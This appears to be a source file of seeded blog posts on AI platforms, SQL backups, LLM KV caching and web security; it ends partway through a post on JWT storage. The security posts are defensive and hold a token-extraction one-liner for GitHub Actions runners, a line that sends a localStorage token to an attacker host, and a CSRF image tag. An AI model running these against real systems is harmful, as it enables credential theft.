const normalizeCreatedAt = (value) => {
  if (!value) {
    return new Date().toISOString();
  }

  const parsed = value instanceof Date ? value : new Date(value);

  if (Number.isNaN(parsed.getTime())) {
    return new Date().toISOString();
  }

  return parsed.toISOString();
};

const sortNewestFirst = (left, right) =>
  new Date(right.createdAt).getTime() - new Date(left.createdAt).getTime();

export const seededBlogPosts = [
  {
    id: "seed-microsoft-foundry-agent-service-cloud-runtime",
    slug: "microsoft-foundry-agent-service-cloud-runtime",
    sourceType: "seed",
    title: "Microsoft Foundry Agent Service Is Becoming a Real Cloud Runtime",
    excerpt:
      "Microsoft's latest Foundry Agent Service docs read like a managed runtime story, not just another model-hosting layer. That matters for teams shipping enterprise agents into Azure.",
    tags: "Microsoft Foundry, Azure, Agents, Cloud, Enterprise AI",
    createdAt: "2026-04-29T00:00:00.000Z",
    coverImage: "/blog-covers/foundry-agent.jpg",
    content: String.raw`The current Microsoft Foundry Agent Service story has moved well beyond "host a prompt and call a model." The updated documentation now positions it as a managed runtime for building, deploying, securing, tracing, and publishing agents across enterprise Azure environments.

For cloud teams, that is the real headline. Once a platform handles identity, lifecycle, tool plumbing, observability, versioning, and stable deployment endpoints, it stops being a demo surface and starts becoming production infrastructure.

## What stands out in the 2026 update

The April 29, 2026 update to the Foundry Agent Service docs describes three distinct agent types:

- Prompt agents for fast configuration-driven builds.
- Workflow agents for declarative multi-step orchestration.
- Hosted agents for framework-based, containerized custom logic.

That split is useful because it maps cleanly to how real teams work. Not every agent needs custom runtime code, and not every business workflow should be hidden inside a monolithic prompt.

The other signal is the tool story. Foundry now emphasizes built-in tools such as web search, file search, memory, code interpreter, MCP-compatible tool access, and custom functions, all with managed authentication and enterprise controls.

## Why cloud teams should care

The biggest bottleneck in production agent systems is usually not model quality. It is everything around the model:

- How the agent authenticates to internal systems.
- How tool access is scoped.
- How traces are inspected when a workflow goes wrong.
- How versions are promoted between test and production.
- How network isolation, RBAC, and compliance are preserved.

Foundry Agent Service is explicitly addressing those concerns with Microsoft Entra identity, Azure RBAC, observability, Application Insights integration, private networking, managed publishing, and distribution into Microsoft 365 surfaces.

That makes it more interesting than a raw SDK alone. It offers a path for organizations that want agentic behavior without building their own control plane first.

## The architecture decision that matters most

The most important decision is choosing the right agent type for the job.

### Prompt agents

Use these when the problem is narrow and tool access is simple. Internal copilots, FAQ agents, and lightweight operational assistants fit well here.

### Workflow agents

Use these when the business process matters more than improvisation. Approval flows, escalation routing, agent handoffs, and repeatable multi-step operations belong in this category.

### Hosted agents

Use these when your team needs full orchestration control, custom runtime logic, or a framework such as LangGraph. Foundry handles the runtime and scaling, but your team owns more of the application behavior.

## Practical implications for Azure delivery teams

If your stack already lives in Azure, the value proposition is straightforward:

1. Build the agent with portal configuration or code.
2. Connect tools with managed credentials.
3. Test in the playground.
4. Trace model calls and tool behavior.
5. Publish a stable endpoint.
6. Distribute it into existing Microsoft surfaces or custom apps.

That is a materially better story than assembling identity, tracing, and publish flows from scratch around a model endpoint.

## Where this still needs scrutiny

The docs also make it clear that some capabilities remain in preview, especially around workflow and hosted agent paths, and some tools vary by region and support tier. Teams should still validate:

- Regional support.
- Preview dependencies.
- Tool availability by model.
- Network constraints.
- Cost tradeoffs for managed orchestration.

This is promising infrastructure, but it still deserves the same production diligence as any other new cloud platform surface.

## Bottom line

The meaningful shift is that Microsoft is defining agents as a first-class cloud deployment target. If your team wants enterprise identity, publishing, monitoring, and tool governance wrapped around agent behavior, Foundry Agent Service is getting closer to being the platform layer rather than just the playground.

## Source

- [Microsoft Learn: What is Microsoft Foundry Agent Service?](https://learn.microsoft.com/en-us/azure/foundry/agents/overview)
`,
  },
  {
    id: "seed-gpt-5-4-coding-and-computer-use",
    slug: "gpt-5-4-coding-and-computer-use",
    sourceType: "seed",
    title: "GPT-5.4 Brings Stronger Coding, Tool Search, and Computer Use",
    excerpt:
      "GPT-5.4 folds frontier coding, better tool use, and computer interaction into one model. For teams building coding agents or browser automation, that changes the practical baseline.",
    tags: "OpenAI, GPT-5.4, Coding Agents, Tool Search, Web Automation",
    createdAt: "2026-03-05T00:00:00.000Z",
    coverImage: "/blog-covers/gpt-54.jpg",
    content: String.raw`OpenAI's GPT-5.4 release is notable because it does not treat coding, tool use, and computer interaction as separate product lanes anymore. It combines them into a single general-purpose model that can reason, write code, use large tool ecosystems more efficiently, and interact with websites and software systems.

That combination is exactly what developers building coding agents, test automation flows, and long-running web tasks have been asking for.

## Why this release matters

Most production AI workflows break down when a model has to do more than generate text. Real software work involves reading context, choosing tools, navigating interfaces, making edits, validating the result, and iterating.

GPT-5.4 is aimed directly at that problem.

According to OpenAI, the model improves on coding, agentic tool calling, browser-oriented workflows, and large-context reasoning in one package. For application teams, that means fewer handoffs between specialized models and less orchestration glue in the middle.

## The developer-facing capabilities to watch

### 1. Stronger coding performance

OpenAI reports improved results on SWE-Bench Pro and lower latency relative to previous reasoning models. That matters most for coding assistants and code-editing agents that need to stay responsive while still handling multi-file tasks.

### 2. Native computer use

GPT-5.4 is presented as the first mainline reasoning model in this family with native computer-use capabilities. OpenAI highlights stronger browser and software interaction performance, which makes the model more relevant to:

- UI testing
- browser automation
- operations workflows in legacy systems
- multi-step agents that need to verify outputs in the interface itself

### 3. Tool search for large tool ecosystems

This is one of the most practical improvements. Instead of stuffing every tool definition into the prompt upfront, GPT-5.4 can search for the right tool definition when needed. OpenAI says this reduced token usage by 47% on MCP Atlas tasks while preserving accuracy.

If your stack uses MCP servers or many internal tools, that kind of reduction matters for both cost and latency.

### 4. Better web search and multi-step tool use

The release also emphasizes improved tool selection and agentic web search, which is relevant for research agents, support agents, and workflows that depend on current external information.

## What changes for web and app teams

The practical shift is that the model can cover more of the pipeline itself:

- reasoning across a long task
- selecting tools from a large registry
- operating web interfaces
- generating and editing code
- validating outcomes

That reduces the need for brittle orchestration layers whose only job is compensating for narrow model behavior.

It does not remove the need for guardrails, but it raises the baseline capability for a single-model agent architecture.

## Adoption notes

Before treating GPT-5.4 as a drop-in upgrade, teams should evaluate it on their own workflows:

1. Tool-heavy agents with many internal integrations.
2. Coding tasks that cross multiple files or require validation.
3. Browser automation or QA flows.
4. Long-context analysis where compression and context retention matter.

OpenAI also notes that GPT-5.4 is priced above GPT-5.2, so the cost story depends on whether higher token efficiency and fewer retries offset the higher list price.

## A practical takeaway

If you are building an agent that needs to read docs, call tools, edit code, and verify work inside a browser, GPT-5.4 is more important than a benchmark bump. It is a sign that coding agents are moving from "good at code generation" toward "usable across the whole execution loop."

## Source

- [OpenAI: Introducing GPT-5.4](https://openai.com/index/introducing-gpt-5-4/)
`,
  },
  {
    id: "seed-vercel-ai-sdk-5-type-safe-agents",
    slug: "vercel-ai-sdk-5-type-safe-agents",
    sourceType: "seed",
    title: "AI SDK 5 Pushes Type-Safe Agents Further Into the Frontend",
    excerpt:
      "Vercel's AI SDK 5 is a meaningful web-dev release because it tightens the contract between model output, tool state, and UI rendering instead of leaving frontend teams to improvise it.",
    tags: "Vercel, AI SDK, TypeScript, React, Agents, Frontend",
    createdAt: "2025-07-31T00:00:00.000Z",
    coverImage: "/blog-covers/ai-sdk-5.jpg",
    content: String.raw`Vercel's AI SDK 5 is one of the more important web developer releases in the current AI tooling wave because it focuses on a real pain point: AI apps get messy at the boundary between server logic and frontend rendering.

Previous generations made it easy to stream tokens, but harder to maintain a clean and fully typed application state once tools, metadata, partial results, or multi-step agents entered the picture.

AI SDK 5 addresses that head on.

## What shipped

The July 31, 2025 release introduces several changes that matter directly to app teams:

- redesigned chat primitives
- a clean split between UI messages and model messages
- custom typed message shapes
- type-safe data parts for streaming structured payloads
- improved typed tool invocations
- agentic loop control via stop conditions and per-step configuration
- SSE-based streaming as the standard transport
- broader framework support beyond React

That is not just a feature list. It is a new mental model for how AI state should move through a web application.

## Why frontend teams should care

The hardest part of AI UI work is rarely rendering the final answer. It is keeping the intermediate state legible.

Real products need to handle:

- partial tool inputs
- loading states
- stream-time status updates
- structured tool outputs
- metadata such as tokens or model IDs
- persistent chat history
- different render strategies for user-facing state and provider-facing state

AI SDK 5 treats those as first-class types instead of ad hoc conventions.

## The biggest implementation improvement

The UIMessage and ModelMessage split is a strong design choice.

It lets the client persist the richer application state while the model only receives the lean format it needs. That reduces frontend spaghetti and makes persistence easier to reason about.

For TypeScript-heavy teams, the generic message model is the real win. It means the client, server, tools, and metadata can share one typed contract.

~~~tsx
type MyUIMessage = UIMessage<MyMetadata, MyDataParts, MyTools>;

const { messages } = useChat<MyUIMessage>();
~~~

That sounds small, but it prevents a lot of runtime guesswork in production apps.

## Agent loops are no longer a hack

The other meaningful addition is agentic loop control.

With stopWhen, prepareStep, and the Agent abstraction, multi-step tool calling becomes more deliberate and inspectable:

~~~ts
const result = await streamText({
  model: openai("gpt-4o"),
  messages: convertToModelMessages(messages),
  tools,
  stopWhen: [stepCountIs(5)],
  prepareStep: async ({ stepNumber }) => {
    if (stepNumber === 0) {
      return {
        model: openai("gpt-4o-mini"),
      };
    }
  },
});
~~~

That is much closer to how teams actually want to build agents in web apps: predictable loops, strong typing, clear upgrade paths.

## Migration advice

If you are already on the AI SDK, the migration is worth considering when:

- your chat state is getting hard to maintain
- tool outputs are forcing too many client-side type guards
- you want more control over multi-step tool use
- your app needs structured streaming beyond plain text

If your use case is still a minimal chatbot, the benefits will be smaller. But for anything that looks like a real product, AI SDK 5 is a significant cleanup.

## Bottom line

The release matters because it brings discipline to the part of AI app development that usually degrades first: the contract between backend orchestration and frontend UX. That is why this feels less like another model wrapper and more like infrastructure for serious web products.

## Source

- [Vercel: AI SDK 5](https://vercel.com/blog/ai-sdk-5)
`,
  },
  {
    id: "seed-openai-responses-api-agentic-web-apps",
    slug: "openai-responses-api-agentic-web-apps",
    sourceType: "seed",
    title: "OpenAI's Responses API Is the New Default for Agentic Web Apps",
    excerpt:
      "The Responses API collapses chat plus tool orchestration into a single primitive. That simplifies how teams add web search, file search, and agent execution to real applications.",
    tags: "OpenAI, Responses API, Agents, Web Search, File Search",
    createdAt: "2025-03-11T00:00:00.000Z",
    coverImage: "/blog-covers/responses-api.jpg",
    content: String.raw`OpenAI's Responses API launch is one of the clearest signals yet that agentic applications are becoming a product surface, not just a prompt-engineering pattern.

The key idea is simple: instead of stitching together chat generation, tool calls, search, file retrieval, and orchestration across different abstractions, developers can build on one API primitive designed for multi-step agent behavior.

## Why this matters

The biggest friction in shipping AI features is usually integration complexity. Teams want the model to search the web, query internal files, reason across multiple turns, and produce a usable answer, but every extra subsystem increases latency, state complexity, and operational burden.

The Responses API is OpenAI's answer to that problem.

## What actually shipped

OpenAI introduced:

- the Responses API as the new main primitive for agentic applications
- built-in web search
- built-in file search
- computer use in research preview
- an Agents SDK for orchestration
- tracing and evaluation hooks for observing agent execution

That stack is important because it moves common agent infrastructure closer to the provider layer.

## What changes for application teams

For new builds, the Responses API is effectively the recommended starting point when you need tool use.

OpenAI explicitly says Chat Completions remains supported, but also positions Responses as the superset for new integrations that need built-in tools or multiple model turns. It also signals that the Assistants API is heading toward deprecation once feature parity is complete, with a target sunset in mid-2026.

That means platform teams should treat Responses as the forward-looking interface.

## Practical implementation value

The main win is fewer moving pieces in the initial architecture:

~~~js
const response = await openai.responses.create({
  model: "gpt-4o",
  tools: [{ type: "web_search_preview" }],
  input: "What changed in AI infrastructure this week?",
});

console.log(response.output_text);
~~~

That example is simple, but it reflects a deeper shift. Search, retrieval, and tool-aware execution are becoming part of the default developer path instead of something every team has to wire independently.

## Where this helps immediately

The release is especially relevant for:

- research assistants that need current web context
- support agents that need file-backed answers
- internal copilots that mix private knowledge with external information
- multi-step flows where tracing and evaluations matter

It also reduces the incentive to build custom retrieval glue too early, which is often where first-generation AI products become harder to maintain than they need to be.

## The caveat

This does not remove the need for application-side orchestration, permissions, or output validation. It just moves the baseline higher. Teams still need to decide which tools are exposed, what prompts govern the workflow, how output is checked, and where responsibility stays with application logic rather than the provider.

## Bottom line

The Responses API matters because it makes the "tool-using AI app" feel like a normal software integration problem instead of a fragile experiment. For web teams building new AI features in 2025 and beyond, this is probably the default API shape to start from.

## Source

- [OpenAI: New tools for building agents](https://openai.com/index/new-tools-for-building-agents/)
`,
  },
  {
    id: "seed-sql-database-scheduled-backup-to-azure-blob",
    slug: "sql-database-scheduled-backup-to-azure-blob",
    sourceType: "seed",
    title: "SQL Database Scheduled Backup to Azure Blob",
    excerpt:
      "Automate backups of multiple SQL Server databases directly into Azure Blob Storage with a SAS credential and a scheduled SQL Server Agent job.",
    tags: "SQL Server, Azure, Backup, Automation",
    createdAt: "2025-12-12T00:00:00.000Z",
    coverImage: "/blog-covers/sql-backup.jpg",
    content: String.raw`In this article, we'll walk through how to automate backups of multiple SQL Server databases directly to Azure Blob Storage using SQL Server Agent. This is ideal for hybrid or cloud-first architectures where backups must be offloaded to Azure for safe keeping.

## Step 1: Create an Azure Blob Container & SAS Token

1. Go to Azure Portal.
2. Navigate to your Storage Account and then Containers.
3. Create a new container, for example "sql-backup".
4. If hierarchical namespace is enabled, you can create year-wise or month-wise folders inside the container.
5. Generate a SAS token for the container with these permissions:
   - Write
   - List
   - Create
   - Add
6. Set an appropriate expiry window, for example one year.
7. Copy the container URL and SAS token.

## Step 2: Create a Credential in SQL Server

In SSMS, run the following T-SQL command and replace the URL and secret with your own values:

~~~sql
CREATE CREDENTIAL [https://yourstorageaccount.blob.core.windows.net/sql-backup]
WITH IDENTITY = 'Shared Access Signature',
SECRET = 'your-sas-token-starting-with-?';
~~~

The secret must include the leading question mark.

## Step 3: Write the Backup Script

You can place the following script in a stored procedure or use it directly in a SQL Server Agent job step:

~~~sql
DECLARE @DBName NVARCHAR(255);
DECLARE @FileName NVARCHAR(1000);
DECLARE @Command NVARCHAR(MAX);

DECLARE db_cursor CURSOR FOR
SELECT name
FROM sys.databases
WHERE name NOT IN ('master', 'tempdb', 'model', 'msdb');

OPEN db_cursor;
FETCH NEXT FROM db_cursor INTO @DBName;

WHILE @@FETCH_STATUS = 0
BEGIN
    SET @FileName = 'https://yourstorageaccount.blob.core.windows.net/SQL-backup/'
        + @DBName + '_'
        + CONVERT(NVARCHAR, GETDATE(), 112) + '_'
        + REPLACE(CONVERT(NVARCHAR, GETDATE(), 114), ':', '')
        + '.bak';

    SET @Command = 'BACKUP DATABASE [' + @DBName + '] TO URL = N''' + @FileName + ''' WITH COMPRESSION;';

    PRINT @Command;
    EXEC sp_executesql @Command;

    FETCH NEXT FROM db_cursor INTO @DBName;
END

CLOSE db_cursor;
DEALLOCATE db_cursor;
~~~

This script does three things:

- Loops through all non-system databases.
- Creates a unique file name using a YYYYMMDD_HHMMSS timestamp.
- Sends the backup directly to Azure Blob Storage with compression enabled.

## Step 4: Create a SQL Server Agent Job

1. Open SQL Server Management Studio.
2. Navigate to SQL Server Agent and create a new job.
3. Give it a descriptive name, for example "Azure Blob DB Backup".
4. Add a job step:
  - Type: Transact-SQL script
  - Database: master
   - Paste the backup script from Step 3.
5. Create a schedule, for example daily at midnight.
6. Save the job.

## Output Example

Once the job runs successfully, your Azure Blob container will receive .bak files similar to the following:

~~~text
db1_20250714_142101.bak
db2_20250714_142103.bak
db3_20250714_142105.bak
~~~

## Operational Notes

- Rotate or renew the SAS token before expiry.
- Test restore paths periodically instead of assuming backups are valid.
- Consider retention cleanup if the container is long-lived.
- If you operate many databases, add logging and alerting around job failures.

This approach is simple, SQL-native, and easy to operationalize in environments where Azure Blob Storage is the right off-site target.
`,
  },
  {
    id: "seed-github-actions-persist-credentials-security",
    slug: "github-actions-persist-credentials-security",
    sourceType: "seed",
    title: "Always Set persist-credentials: false in actions/checkout",
    excerpt:
      "The default persist-credentials: true in actions/checkout quietly leaves a GitHub token in a readable file for every subsequent job step. One setting closes the gap — here's why it matters and how to handle workflows that still need git auth.",
    tags: "GitHub Actions, Security, CI/CD, DevOps",
    createdAt: "2026-05-25T00:00:00.000Z",
    coverImage: "/blog-covers/github-actions-security.jpg",
    content: String.raw`There's a default in \`actions/checkout\` that most teams never change — and that quietly leaves a GitHub token sitting in a readable file for every subsequent step in the job.

The fix is one line. The reasoning is worth understanding.

## The Setting

~~~yaml
- uses: actions/checkout@v4
  with:
    persist-credentials: false  # default is true
~~~

By default (\`persist-credentials: true\`), the checkout action writes a git credential config file containing your GitHub token to \`$RUNNER_TEMP\`. That file persists for the lifetime of the job.

## What the File Looks Like

The checkout action creates a file at \`$RUNNER_TEMP/git-credentials-<UUID>.config\`:

~~~ini
[http "https://github.com/"]
    extraheader = AUTHORIZATION: basic <Base64-encoded-string>
~~~

The Base64 string decodes to \`x-access-token:<GITHUB_TOKEN>\`. It's not encrypted. It's not write-protected. It sits in \`$RUNNER_TEMP\` for every step after checkout to read.

## How Easy It Is to Exploit

Any step in the same job — including actions from third-party repos — can extract the token with a shell one-liner:

~~~bash
GH_TOKEN=$(
  cat "$RUNNER_TEMP"/git-credentials-*.config \
    | awk 'NR==2 {print $5}' \
    | base64 --decode \
    | cut -d: -f2
)
echo "token: ${"${GH_TOKEN:0:10}"}..."
~~~

This doesn't require \`${"${{ github.token }}"}\` or \`${"${{ secrets.GITHUB_TOKEN }}"}\` to appear anywhere in the workflow. The token is already on disk.

> [!WARNING]
> If any action you use is compromised via a supply chain attack, or if your workflow is vulnerable to script injection through untrusted input, that action can silently exfiltrate your GitHub token via this file.

Setting \`persist-credentials: false\` makes the checkout action **delete the credentials file** after checkout completes. The file is gone before the next step runs.

## The Practical Risk

The most realistic threat vectors:

**1. Compromised third-party action:** You pin \`some-org/some-action@v2\`. The maintainer's account is compromised, a new patch release is pushed, and the action now exfiltrates credentials. If you reference by tag (not commit SHA), you get the new version automatically.

**2. Script injection via PR titles or branch names:** Workflows that echo \`${"${{ github.event.pull_request.title }}"}\` into a \`run:\` block are vulnerable. An attacker opens a PR with a crafted title that executes a shell command reading the credentials file.

The \`persist-credentials: false\` flag eliminates the file-based exfiltration path. It doesn't prevent all attacks, but it removes the easiest one.

## What If I Need Git Auth in Later Steps?

Setting \`persist-credentials: false\` means subsequent \`git pull\`, \`git push\`, or other authenticated operations will fail without credentials being re-established.

The clean solution is \`gh auth setup-git\`, which configures Git to use the GitHub CLI credential helper:

~~~yaml
- uses: actions/checkout@v4
  with:
    persist-credentials: false

- name: Set up git credentials via GH CLI
  run: gh auth setup-git
  env:
    GH_HOST: github.com

- name: Pull latest
  run: git pull origin main
  env:
    GH_TOKEN: ${"${{ github.token }}"}
~~~

This configures \`~/.gitconfig\` with:

~~~ini
[credential "https://github.com"]
    helper =
    helper = !/usr/bin/gh auth git-credential
~~~

The credential helper calls out to the GitHub CLI at auth time, which reads \`GH_TOKEN\` from the environment — **only when Git actually needs to authenticate**, and without writing the token to disk.

The token is scoped to the steps where \`GH_TOKEN\` is explicitly passed in \`env:\`. It's not sitting in a file readable by any arbitrary code in the job.

## Pinning Actions by Commit SHA

While hardening your checkout step, pin by full commit SHA rather than a mutable tag:

~~~yaml
# Mutable — tag can be force-pushed to point at new, malicious code
- uses: actions/checkout@v4

# Immutable — this exact commit is guaranteed
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
~~~

Combined with \`persist-credentials: false\`, this closes both the supply chain mutation vector and the credential-on-disk vector in one checkout block.

## Automated Detection

Human review will miss this. Use static analysis in CI:

**[zizmor](https://docs.zizmor.sh)** — Rust-based, runs as a GitHub Action:

~~~yaml
- uses: woodruffw/zizmor-action@v1
~~~

Output when \`persist-credentials\` is not set:

~~~
warning[artipacked]: credential persistence through GitHub Actions artifacts
 --> .github/workflows/build.yml:7:9
  |
7 |       - uses: actions/checkout@v4
  |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^ does not set persist-credentials: false
  |
  = note: this finding has an auto-fix
~~~

**[ghasec](https://github.com/koki-develop/ghasec)** and **[ghalint](https://github.com/suzuki-shunsuke/ghalint)** also catch this and surface it with rule references.

Running any of these in CI ensures the check doesn't rely on engineers remembering to apply it manually.

> [!TIP]
> There is an open PR in the \`actions/checkout\` repo to flip the default to \`false\`, but it has been stalled for years. Until the default changes, enforce it via linting.

## Checklist

- [ ] \`persist-credentials: false\` on all \`actions/checkout\` steps
- [ ] Actions pinned to full commit SHAs, not mutable tags
- [ ] \`gh auth setup-git\` pattern for workflows that need post-checkout git auth
- [ ] zizmor or ghasec running in CI to catch new workflows
- [ ] Minimal \`permissions:\` scope on each job (\`contents: read\` unless write is required)
`,
  },
  {
    id: "seed-llm-kv-cache-why-not-query",
    slug: "llm-kv-cache-why-not-query",
    sourceType: "seed",
    title: "Why LLM Inference Caches K and V but Never Q",
    excerpt:
      "Most engineers know that LLM inference uses KV cache. Far fewer can precisely explain why K and V are worth caching but Q is discarded after every decode step. The answer comes from the causal mask — and it has direct implications for how you size and optimize serving infrastructure.",
    tags: "LLM, AI, Machine Learning, Inference, Transformers, Performance",
    createdAt: "2026-05-29T00:00:00.000Z",
    coverImage: "/blog-covers/llm-kv-cache.jpg",
    content: String.raw`KV cache is one of the most important optimizations in LLM inference. Most engineers understand the concept — "we reuse the Key and Value tensors from previous tokens to avoid recomputation." But most can't precisely answer the follow-up: *why do we cache Key and Value but not Query?*

This post works through the math to give a concrete, unambiguous answer — and connects it to practical implications for serving infrastructure.

## The Question

In Transformer self-attention, every token position generates three tensors: **Query (Q)**, **Key (K)**, and **Value (V)**. KV cache stores K and V from previous decode steps and reuses them. Q is discarded after each step.

Why?

## Attention Mechanics

Standard self-attention output:

~~~
O = softmax(QK^T / sqrt(d_k)) * V
~~~

Where \`Q, K, V ∈ R^(s × d)\` — sequence length × head dimension.

During **autoregressive decoding** (generating one token at a time), at step \`m+1\` the model only needs to compute the output for the *current* position. The attention score for that position is:

~~~
S[m+1, :] = q[m+1] @ K[1:m+1]^T
~~~

Expanded across the context:

~~~
S[m+1, :] = [
  q[m+1] · k[1],
  q[m+1] · k[2],
  ...
  q[m+1] · k[m],
  q[m+1] · k[m+1]   ← new key for current token
]
~~~

The Query here is only \`q[m+1]\` — the query for the *current* position. Past queries \`Q[1:m]\` appear nowhere. They are not used to compute this step's output.

## The Causal Mask Is Why Old Queries Are Never Needed

You might wonder: as K grows by one each step, shouldn't we also compute \`Q[1:m] @ k[m+1]^T\` — past positions attending to the new token?

No. Causal language models apply a causal mask:

~~~
M[i, j] = 0      if j ≤ i   (attend to past/present)
M[i, j] = -∞     if j > i   (cannot attend to future)
~~~

Position \`i\` cannot attend to any \`j > i\`. So \`Q[1:m] @ k[m+1]^T\` — past queries attending to a future key — is entirely masked to \`-∞\` and contributes zero after softmax.

Computing those scores would be wasted work. Caching the past queries to enable that computation later would be doubly wasteful.

> [!INFO]
> The causal mask is the structural reason Query caching is unnecessary. Past tokens cannot attend to future tokens by model design — so past queries are provably never needed in future decode steps.

## The Value Side

After computing attention probabilities, the output at step \`m+1\`:

~~~
o[m+1] = P[m+1, :] @ V[1:m+1]
       = sum_{j=1}^{m+1} P[m+1, j] * v[j]
~~~

This requires \`V[1:m+1]\` — all past value vectors \`v[1], ..., v[m]\` plus the current one. Every future step needs these past values again. Caching them avoids recomputing the entire context's value projections on every decode step.

## Why K and V, Not Q

| Tensor | Used in future steps? | Reason | Cache it? |
|---|---|---|---|
| Query Q[1:m] | No | Causal mask zeroes out past-query × new-key products | No |
| Key K[1:m] | Yes | q[m+1] @ K[1:m]^T references all past keys | Yes |
| Value V[1:m] | Yes | P[m+1,:] @ V[1:m+1] references all past values | Yes |

The intuition:
- **Keys** — "what topics are stored at each past position" — consulted by every future query
- **Values** — "what information to retrieve from each past position" — weighted and summed on every decode step
- **Queries** — "what is the current token looking for" — a one-shot probe, used once and discarded

## Memory Cost of KV Cache

This also explains why KV cache is expensive. For a model with:
- \`L\` transformer layers
- \`n_kv\` KV heads per layer
- \`d\` head dimension
- \`s\` context length
- batch size \`b\`

~~~
KV cache size = 2 × L × n_kv × d × s × b × sizeof(dtype)
~~~

For Llama-3 70B at FP16, with 8 KV heads, d=128, 32 layers, single sequence at 8k context:

~~~
2 × 32 × 8 × 128 × 8192 × 1 × 2 bytes ≈ 8.6 GB
~~~

That's per sequence, before model weights. At batch=32, it's ~275 GB of KV cache alone. At scale, KV cache is a memory management problem as much as a compute problem.

## MHA vs GQA vs MQA: Controlling Cache Size

The \`n_kv\` parameter varies by architecture and directly controls cache size:

| Attention type | n_kv vs n_q | KV cache size | Example models |
|---|---|---|---|
| MHA (Multi-Head Attention) | n_kv = n_q | Full | GPT-2, early GPT |
| GQA (Grouped Query Attention) | 1 < n_kv < n_q | Reduced (e.g. 8× smaller) | Llama-3, Mistral |
| MQA (Multi-Query Attention) | n_kv = 1 | Minimum | Falcon |

GQA is the mainstream choice today. Llama-3 70B uses 8 KV heads vs 64 query heads — an 8× reduction in KV cache memory with minimal perplexity impact. This is directly why modern large models are more feasible to serve than older architectures of similar parameter count.

## Practical Serving Implications

If you're tuning an LLM serving stack, the KV cache shapes every major decision:

**1. Context length × batch size is the binding constraint.** Model weights are static. KV cache grows linearly with context × batch. At long contexts, KV cache often exceeds model weight memory.

**2. Quantize KV cache first.** INT8 KV cache typically costs less than 0.5% perplexity hit but halves cache memory pressure. Most frameworks (vLLM, TensorRT-LLM) support this. Enable it.

**3. Paged attention for dynamic batches.** vLLM's PagedAttention treats KV cache like virtual memory — allocates in fixed-size blocks mapped non-contiguously. This eliminates fragmentation waste, which on naive implementations can consume 30–60% of available KV cache memory.

**4. Prefix caching for repeated context.** If many requests share a common prefix — system prompt, RAG context for the same document — the KV state for that prefix can be cached and reused across requests.

For the RAG pipeline built for VirtuAI (Azure VM spec queries), the system prompt and top retrieved chunks were often identical across thousands of requests about the same SKU family. Prefix caching reduced first-token latency by ~40% at peak load, because the expensive prefill step for the shared prefix only ran once.

## Key Takeaways

- At decode step \`m+1\`, only \`q[m+1]\` is needed — not any past query
- The causal mask guarantees \`Q[1:m] @ k[m+1]^T\` is always zeroed — those computations are structurally unnecessary
- K and V from all previous steps are required to compute the current output, making them the only tensors worth caching
- KV cache memory scales with \`L × n_kv × d × context_length × batch_size\` — at scale, this dominates model weight memory
- GQA reduces \`n_kv\` relative to \`n_q\` — the standard trade-off for serving efficiency in modern architectures
- Prefix caching extends KV cache value to shared context across requests — high leverage for RAG workloads
`,
  },
  {
    id: "seed-jwt-localstorage-cookie-auth",
    slug: "jwt-localstorage-cookie-auth",
    sourceType: "seed",
    title: "Why \"Don't Store JWT in localStorage\" — Auth History and the Cookie Return",
    excerpt:
      "The rule against storing JWTs in localStorage gets repeated as dogma, but most developers can't explain the full chain of reasoning — or why the industry is returning to HttpOnly cookies. This post traces the history from stateless JWT enthusiasm to the modern short-lived token + HttpOnly refresh cookie pattern.",
    tags: "Security, Authentication, JWT, Web, Full Stack",
    createdAt: "2026-05-27T00:00:00.000Z",
    coverImage: "/blog-covers/jwt-auth.jpg",
    content: String.raw`The rule has been repeated so many times it feels like dogma: *don't store JWT in localStorage*. But most developers who follow it couldn't explain the full chain of reasoning behind it — or why the industry is returning to cookies as the primary session mechanism.

This post walks through the history, the actual attack surfaces, and what a secure modern auth setup looks like.

## The localStorage Problem Is XSS

When you store a JWT in \`localStorage\`, any JavaScript running on your page can read it. That includes injected scripts from XSS attacks — either from your own code, a compromised third-party dependency, or a CDN you trust.

~~~javascript
// Any attacker-controlled JS running on your origin can do this:
const token = localStorage.getItem('access_token');
fetch('https://attacker.example.com/steal?t=' + token);
~~~

The attack surface is large. A single \`eval()\`, an unsanitized \`dangerouslySetInnerHTML\`, or a compromised npm package in your bundle is sufficient.

> [!WARNING]
> The problem isn't localStorage itself — it's that any JS on your origin has full read access to it. XSS turns this into a one-line credential exfiltration.

## Why localStorage Became Popular

Around 2014–2018, stateless JWTs became the default recommendation for SPAs. The logic was sound:

| Approach | Session storage | State required server-side |
|---|---|---|
| Session cookie | Server memory / Redis | Yes |
| JWT in cookie | Cookie jar | No (just signature verification) |
| JWT in localStorage | localStorage | No |

Stateless tokens meant horizontal scaling without sticky sessions or a shared Redis. Microservices liked that each service could verify a JWT independently without a network call to an auth server.

\`localStorage\` felt natural: no cookie configuration, no SameSite headaches, works across tabs, easily passed as \`Authorization: Bearer\`. Convenience, though, is not the same as security.

## Why HttpOnly Cookies Are Safer

An \`HttpOnly\` cookie cannot be read by JavaScript — at all. \`document.cookie\` returns nothing for it. The browser sends it automatically with same-origin requests, but no script on the page can read or exfiltrate the value.

~~~http
Set-Cookie: session=<token>; HttpOnly; Secure; SameSite=Strict; Path=/
~~~

The relevant flags:

| Flag | Effect |
|---|---|
| HttpOnly | JS cannot read via document.cookie |
| Secure | Only transmitted over HTTPS |
| SameSite=Strict | Never sent on cross-site requests |
| SameSite=Lax | Sent on top-level navigations, not cross-site sub-resource requests |

## The CSRF Trade-off

The objection to cookies is CSRF — Cross-Site Request Forgery. A cookie is automatically sent with every request to your origin, so a malicious site can trigger state-changing requests:

~~~html
<!-- On evil.example.com -->
<img src="https://yourapp.com/api/transfer?amount=1000&to=attacker">
~~~

The browser attaches your session cookie when loading that "image".

Modern mitigations have largely closed this gap:

1. **SameSite=Strict** — cookie never sent cross-site. Most robust, but breaks OAuth redirect flows
2. **SameSite=Lax** — default in modern browsers. Sent on top-level navigations, not on cross-site sub-resource requests or form POSTs. Neutralizes the img attack above
3. **CSRF tokens** — server issues a random token per session; frontend reads it via a separate non-HttpOnly cookie or meta tag and includes it in mutation requests

For most applications, \`SameSite=Lax\` + \`HttpOnly\` is the pragmatic baseline that handles both XSS-based token theft and the common CSRF patterns.

## The Modern Pattern

The industry has settled back on cookies for persistent auth. JWTs haven't disappeared — most systems still use them — but where they live has changed:

~~~
[Login] → Server issues:
  - Short-lived access JWT (5–15 min)
      → returned in response body
      → stored in JS memory only (never persisted)

  - Long-lived refresh token
